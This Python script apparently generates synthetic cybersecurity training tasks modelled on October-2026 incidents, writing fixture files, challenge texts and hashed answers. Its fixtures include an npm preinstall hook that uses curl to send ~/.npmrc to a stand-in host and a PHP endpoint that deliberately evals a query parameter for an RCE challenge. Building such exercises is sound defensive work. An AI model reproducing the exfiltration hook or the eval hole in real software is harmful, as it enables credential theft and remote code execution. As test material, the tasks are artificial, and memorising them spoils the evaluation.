#!/usr/bin/env python3
"""Generate the cybergym_incidents_oct tasks: eight more October-2026 incident
classes (synthetic, deterministic). Same verification model as supply-chain:
answers hashed server-side; nothing inside the workspace reveals them."""
import hashlib
import json
import os

HERE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "tasks")


def W(task, name, text):
    os.makedirs(os.path.dirname(os.path.join(HERE, task, name)), exist_ok=True)
    with open(os.path.join(HERE, task, name), "w") as h:
        h.write(text)


def answer_file(task, answer):
    with open(os.path.join(HERE, task, "answer.sha256"), "w") as h:
        h.write(hashlib.sha256(answer.encode()).hexdigest() + "\n")


def exposed_status_secrets():
    token = "rwy_live_9f3k2m8dQ7xV4nBz"
    W("exposed-status-secrets", "status.json", json.dumps({
        "status": "degraded", "region": "us-east",
        "internal": {"deploy_token": token, "db_host": "10.0.0.9"},
    }, indent=1) + "\n")
    W("exposed-status-secrets", "monitor.sh", "#!/bin/sh\ncurl -s https://status.example.internal/status.json\n")
    W("exposed-status-secrets", "challenge.txt",
      "A public status endpoint accidentally embedded an internal deploy token.\n"
      "Find the token in status.json and submit it exactly.\n")
    answer_file("exposed-status-secrets", token)


def planted_ssh_key():
    fp = "SHA256:9k2mQv7XRp4Ld8Zn1cB3eF6aH0sJ5uT2wY4iO8pA7bC"
    keys = [
        "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDev-team+normal+key+01 ops@laptop",
        "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDev-team+normal+key+02 ci@runner",
        "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIbackdoor+planted+by+intruder x@relay",
    ]
    W("planted-ssh-key", "authorized_keys", "\n".join(keys) + "\n")
    W("planted-ssh-key", "auth.log",
      "Oct 20 03:12:02 bastion sshd[41233]: Accepted publickey for deploy from 198.51.100.77 port 51022 ssh2: Ed25519 SHA256:9k2mQv7XRp4Ld8Zn1cB3eF6aH0sJ5uT2wY4iO8pA7bC\n"
      "Oct 20 03:12:09 bastion sshd[41233]: subsystem request for sftp\n")
    W("planted-ssh-key", "challenge.txt",
      "An intruder added their key to authorized_keys and used it (see auth.log).\n"
      "Submit the FINGERPRINT of the attacker's key, exactly as it appears in the\n"
      "log (SHA256:... form).\n")
    answer_file("planted-ssh-key", fp)


def api_keys_in_logs():
    live = "sk-ant-api03-7kQ9m2vX4zR8pL1cD6fH3jT"
    W("api-keys-in-logs", "debug.log",
      "[02:11:04] request headers: authorization=Bearer sk-ant-api03-DEAD-test-0000000000000000\n"
      "[02:11:05] provider=anthropic status=401 (test key rejected)\n"
      "[02:12:41] request headers: authorization=Bearer " + live + "\n"
      "[02:12:42] provider=anthropic status=200\n"
      "[02:14:02] request headers: authorization=Bearer sk-ant-api03-DEAD-test-1111111111111111\n")
    W("api-keys-in-logs", "challenge.txt",
      "A CLI tool logged full API keys at debug level. Exactly one of them was\n"
      "live (the request that succeeded). Submit that key exactly.\n")
    answer_file("api-keys-in-logs", live)


def checksum_swap():
    bad = "ovhctl"
    lines = [
        "v2.3.0  4a1f9c2e8b7d6305aaaa1111  ovhctl",
        "v2.3.0  bb90d1f27e4c6305aaaa2222  ovhctl-helper",
        "v2.3.1  7c3e5a9d1b2f8406bbbb3333  ovhctl",
        "v2.3.1  bb90d1f27e4c6305aaaa2222  ovhctl-helper",
    ]
    W("checksum-swap", "SHA256SUMS.txt", "\n".join(lines) + "\n")
    W("checksum-swap", "advisory.txt",
      "The v2.3.1 release was rebuilt on a compromised builder. One binary\n"
      "changed its checksum between v2.3.0 and v2.3.1; every other artifact is\n"
      "byte-identical across the two releases.\n")
    W("checksum-swap", "challenge.txt",
      "Two SHA256SUMS files are merged in SHA256SUMS.txt (v2.3.0 and v2.3.1).\n"
      "Exactly one binary's checksum changed between the releases. Submit that\n"
      "binary's name exactly.\n")
    answer_file("checksum-swap", bad)


def backup_rogue_account():
    rogue = "svc-bkp7781$"
    W("backup-rogue-account", "backup-config.yaml",
      "backup_targets:\n"
      "  - account: CORP\\backup-svc\n"
      "    scope: full\n"
      "  - account: CORP\\audit-ro\n"
      "    scope: read-only\n"
      "  - account: CORP\\" + rogue + "\n"
      "    scope: full\n"
      "    note: added 2026-10-14 by hotfix\n")
    W("backup-rogue-account", "directory.ldif",
      "dn: CN=backup-svc,OU=Service,DC=corp\n"
      "dn: CN=audit-ro,OU=Service,DC=corp\n"
      "dn: CN=" + rogue + ",OU=Temp,DC=corp\n")
    W("backup-rogue-account", "challenge.txt",
      "Cloud backup identities were compromised: a rogue account was added to\n"
      "the backup configuration and is NOT a legitimate service account in the\n"
      "directory (and was created mid-incident). Submit the rogue account name\n"
      "exactly as written in backup-config.yaml (after CORP\\).\n")
    answer_file("backup-rogue-account", rogue)


def php_rce_url():
    marker = "RDZWNED7XK"
    W("php-rce-url", "www/index.php",
      "<?php\n"
      "// legacy render endpoint\n"
      "$cmd = $_GET['render'] ?? '';\n"
      "if ($cmd !== '') { eval('$r = ' . $cmd . ';'); echo $r; }\n"
      "else { echo 'ready'; }\n")
    W("php-rce-url", "www/secret.php", "<?php // " + marker + " ?>\n")
    W("php-rce-url", "challenge.txt",
      "index.php evals whatever arrives in the render parameter. Craft the exact\n"
      "VALUE of ?render= that reads secret.php and prints its comment marker.\n"
      "Run it locally (php -S is available: `php -S 127.0.0.1:8080 -t www`)\n"
      "and submit the printed marker exactly.\n")
    answer_file("php-rce-url", marker)


def npm_preinstall_exfil():
    url = "https://metrics-collect.example.dev/ping/4f7a"
    pkg = {
        "name": "@tensor/codec-lite", "version": "2.1.4",
        "scripts": {"preinstall": "curl -s -X POST -d @~/.npmrc " + url + " >/dev/null || true"},
    }
    W("npm-preinstall-exfil", "package.json", json.dumps(pkg, indent=2) + "\n")
    W("npm-preinstall-exfil", "challenge.txt",
      "This package's install hook exfiltrates a credentials file. Submit the\n"
      "exact destination URL it sends to.\n")
    answer_file("npm-preinstall-exfil", url)


def release_rollback():
    clean = "1.4.2"
    W("release-rollback", "releases.txt",
      "1.4.0  published 2026-10-02  notes: parser fix\n"
      "1.4.1  published 2026-10-14  notes: perf improvements\n"
      "1.4.2  published 2026-10-16  notes: revert 1.4.1 (unmaintained source)\n"
      "1.4.3  published 2026-10-18  notes: rebuilt from verified source\n")
    W("release-rollback", "incident.txt",
      "The 1.4.1 release came from a compromised build path and was reverted.\n"
      "The 1.4.3 line is the first rebuilt from verified source; 1.4.2 is the\n"
      "rollback of the bad release and contains no new code.\n")
    W("release-rollback", "challenge.txt",
      "Read the release history. The last SAFE version built entirely from the\n"
      "original (uncompromised) pipeline is the rollback release. Submit its\n"
      "version number exactly (e.g. 1.4.0).\n")
    answer_file("release-rollback", clean)


TASKS = [
    ("exposed-status-secrets", "Railway-style: internal token in a public status artifact"),
    ("planted-ssh-key", "Zeabur-style: intruder SSH key + its use in logs"),
    ("api-keys-in-logs", "OpenCode-style: live API key among logged test keys"),
    ("checksum-swap", "OVHcloud-style: the one binary whose checksum changed"),
    ("backup-rogue-account", "ConnectWise-style: rogue backup identity"),
    ("php-rce-url", "PHP RCE-style: craft the eval payload, print the marker"),
    ("npm-preinstall-exfil", "Tensorlake/SubQuery-style: preinstall exfil URL"),
    ("release-rollback", "incident response: last safe release version"),
]


def main():
    for fn in (exposed_status_secrets, planted_ssh_key, api_keys_in_logs, checksum_swap,
               backup_rogue_account, php_rce_url, npm_preinstall_exfil, release_rollback):
        os.makedirs(os.path.join(HERE, fn.__name__.replace("_", "-")), exist_ok=True)
        fn()
    index = {
        "env": "cybergym-incidents-oct",
        "description": "Eight more October-2026 incident classes as synthetic tasks (exposed secrets, planted keys, keys in logs, checksum swaps, rogue backup identities, PHP eval RCE, npm preinstall exfil, safe-release identification). Server-side hash verification.",
        "tasks": [{"task_id": t, "split": "train", "verify": "hash"} for t, _ in TASKS],
    }
    with open(os.path.join(HERE, "index.json"), "w") as h:
        json.dump(index, h, indent=2)
    print("tasks generated:", len(TASKS))


if __name__ == "__main__":
    main()
